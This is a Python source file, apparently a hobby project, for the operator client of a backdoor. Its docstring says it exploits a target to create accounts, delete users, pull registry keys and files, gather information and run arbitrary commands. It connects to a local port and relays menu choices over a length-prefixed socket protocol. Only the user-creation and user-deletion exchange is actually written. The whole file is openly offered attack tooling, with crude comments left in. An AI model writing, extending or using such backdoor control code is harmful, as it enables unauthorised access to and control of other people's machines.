#!/usr/bin/env python
__author__ = "Suraj S Kattige"
__version__ = "1.0.0"
__email__ = "suraj.kattige056@gmail.com"
__maintainer__ = "Suraj S Kattige"
'''
Description: This is the client program that exploits a target, creating a backdoor and executing the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

import socket, re, subprocess, time, struct

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len)

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data)
    return

def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)

def main():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    HOST = '127.0.0.1'
    PORT = 50010
    sock.connect((HOST,PORT))
    while True:
        print("So, you have the below choices:")
        print('1) Create User [CU]')
        print('2) Delete User [DU]')
        print('3) Download Registry Key [DRK]')
        print('4) Download file [DF]')
        print('5) Gather Information [GI]')
        print('6) Execute Command [EC]')
        print('7) Exit [E]')
        choice = input('So, what\'s it gonna be? ')
        choice = choice.upper()
        if((choice == 'E') or ((choice != 'CU') and (choice != 'DU') and (choice != 'DRK') and (choice != 'DF') and (choice != 'GI') and (choice != 'EC'))):
#            print('It is surprisingly enting here again!!!')
            choice = 'E'
            choice = choice.encode('UTF-8')
            send_data(sock, (choice))
            sock.close()
            break
        elif (choice == 'CU') or (choice == 'DU'):
#            print('This bitch is entering here')
            choice = choice.encode('utf-8')
            username_prompt = get_data(sock, choice) #Send choice, then recieve username prompt
            if type(username_prompt) == bytes:
                username_prompt = username_prompt.decode('UTF-8')
            print(username_prompt)
            send_data(sock, input().encode('UTF-8'))
            password_prompt = recv_data(sock)
            if type(password_prompt) == bytes:
                password_prompt = password_prompt.decode('UTF-8')
            print(password_prompt)
            send_data(sock, input().encode('UTF-8'))
            result = recv_data(sock)
            if type(result) == bytes:
                result = result.decode('UTF-8')
            print(result)
            '''
            This is the old code
            password_prompt = get_data(sock, input().encode('UTF-8')) #Send the username, then receive prompt for password
            print(password_prompt)
            send_data(sock, input().encode('UTF-8'))
            '''

    sock.close()
    return


main()